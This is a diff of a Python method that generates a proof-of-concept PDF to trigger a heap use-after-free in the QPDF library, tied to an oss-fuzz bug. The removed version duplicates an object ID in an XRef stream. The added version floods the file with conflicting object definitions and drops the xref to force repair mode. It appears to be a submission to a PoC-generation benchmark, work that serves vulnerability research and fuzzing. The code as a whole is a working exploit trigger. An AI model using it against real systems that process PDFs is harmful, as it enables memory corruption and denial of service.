@@ -1,87 +1,61 @@
-import struct
+import io
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Generate a PDF with a Heap Use After Free vulnerability trigger.
-        # Target: oss-fuzz:42535152 (QPDFWriter::preserveObjectStreams)
-        # Vulnerability is triggered by multiple entries for the same object ID
-        # in the object cache, often via duplicate entries in an XRef stream.
-
-        # PDF Header
-        header = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"
+        """
+        Generate a PoC that triggers the Heap Use After Free vulnerability in QPDF.
+        The vulnerability allows QPDF::getCompressibleObjSet to delete objects from 
+        the object cache when there are multiple entries for the same object id.
+        """
+        out = io.BytesIO()
         
-        # Obj 1: Catalog
-        o1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
+        # PDF Header with binary marker
+        out.write(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
         
-        # Obj 2: Pages
-        o2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
-        
-        # Obj 3: Page
-        o3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 600 800] >>\nendobj\n"
-        
-        # Obj 4: Object Stream containing Obj 5
-        # Structure: "id offset" (header) + objects
-        # Content: "5 0 " (4 bytes) + "<< >>" (5 bytes)
-        # /First must be 4
-        stm_content = b"5 0 << >>"
-        o4_dict = b"<< /Type /ObjStm /N 1 /First 4 /Length " + str(len(stm_content)).encode() + b" >>"
-        o4 = b"4 0 obj\n" + o4_dict + b"\nstream\n" + stm_content + b"\nendstream\nendobj\n"
-        
-        # Assemble body to calculate offsets
-        body = o1 + o2 + o3 + o4
-        
-        base_offset = len(header)
-        off1 = base_offset
-        off2 = off1 + len(o1)
-        off3 = off2 + len(o2)
-        off4 = off3 + len(o3)
-        # Obj 6 (XRef Stream) will follow body
-        off6 = base_offset + len(body)
-        
-        # Construct XRef Stream (Obj 6)
-        # We use W = [1, 2, 1] for compact representation.
-        # Fields: Type (1 byte), Field2 (2 bytes), Field3 (1 byte)
-        
-        def pack_entry(t, f2, f3):
-            return struct.pack('>BHB', t, f2, f3)
-        
-        # Entries:
-        # 0: Free
-        row0 = pack_entry(0, 0, 255)
-        # 1: Catalog (Type 1, offset, gen 0)
-        row1 = pack_entry(1, off1, 0)
+        # Standard Objects (Catalog, Pages, Page, Empty Stream)
+        # 1: Catalog
+        out.write(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
         # 2: Pages
-        row2 = pack_entry(1, off2, 0)
+        out.write(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
         # 3: Page
-        row3 = pack_entry(1, off3, 0)
-        # 4: ObjStm
-        row4 = pack_entry(1, off4, 0)
-        # 5: Object inside ObjStm 4 (Type 2, stm obj number 4, index 0)
-        row5 = pack_entry(2, 4, 0)
-        # 6: XRef Stream itself
-        row6 = pack_entry(1, off6, 0)
+        out.write(b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n")
+        # 4: Content Stream
+        out.write(b"4 0 obj\n<< /Length 0 >>\nstream\nendstream\nendobj\n")
         
-        # XRef Stream Data Construction
-        # We intentionally define ID 5 twice to trigger the vulnerability.
-        # /Index [ 0 6 5 1 6 1 ]
-        # Range 1 (0, 6): IDs 0, 1, 2, 3, 4, 5
-        # Range 2 (5, 1): ID 5 (Duplicate)
-        # Range 3 (6, 1): ID 6
+        # Construct the payload to trigger the UAF
+        # We need multiple entries for the same Object ID to confuse the object cache.
+        # Specifically, we use an Object Stream (ID 5) that contains Object 10,
+        # and also define Object 10 loosely. We also duplicate the stream definition itself.
         
-        xref_data = (
-            row0 + row1 + row2 + row3 + row4 + row5 + # IDs 0-5
-            row5 +                                    # ID 5 (Duplicate)
-            row6                                      # ID 6
+        # Object Stream 5 Data: Defines Object 10 at offset 0
+        # "10 0 " is 5 bytes. Object content follows.
+        stm_content = b"10 0 (inside_stream)"
+        stm_len = str(len(stm_content)).encode()
+        
+        obj_stm = (
+            b"5 0 obj\n"
+            b"<< /Type /ObjStm /N 1 /First 5 /Length " + stm_len + b" >>\n"
+            b"stream\n" + stm_content + b"\nendstream\nendobj\n"
         )
         
-        o6_dict = (
-            b"<< /Type /XRef /Size 7 /W [ 1 2 1 ] /Root 1 0 R "
-            b"/Index [ 0 6 5 1 6 1 ] /Length " + str(len(xref_data)).encode() + b" >>"
-        )
+        # Loose definition of Object 10
+        loose_10 = b"10 0 obj\n(loose_object)\nendobj\n"
         
-        o6 = b"6 0 obj\n" + o6_dict + b"\nstream\n" + xref_data + b"\nendstream\nendobj\n"
+        # Loose definition of Object 5 (conflicting with the stream definition)
+        loose_5 = b"5 0 obj\n(loose_stream_conflict)\nendobj\n"
         
-        # Trailer part (startxref)
-        trailer = b"\nstartxref\n" + str(off6).encode() + b"\n%%EOF\n"
+        # Create a repetitive block of conflicting definitions.
+        # Interleaving them maximizes the chance of cache state corruption during repair/linearization.
+        block = obj_stm + loose_10 + loose_5 + loose_10 + obj_stm
         
-        return header + body + o6 + trailer
+        # Repeat the block sufficient times to ensure cache thrashing
+        # 50 iterations * ~300 bytes = ~15KB
+        for _ in range(50):
+            out.write(block)
+            
+        # Trailer
+        # We omit the XRef table and startxref to force QPDF to perform a linear scan (repair mode),
+        # which ensures all duplicate objects are processed and added/removed from the cache.
+        out.write(b"trailer\n<< /Root 1 0 R /Size 11 >>\n%%EOF\n")
+        
+        return out.getvalue()
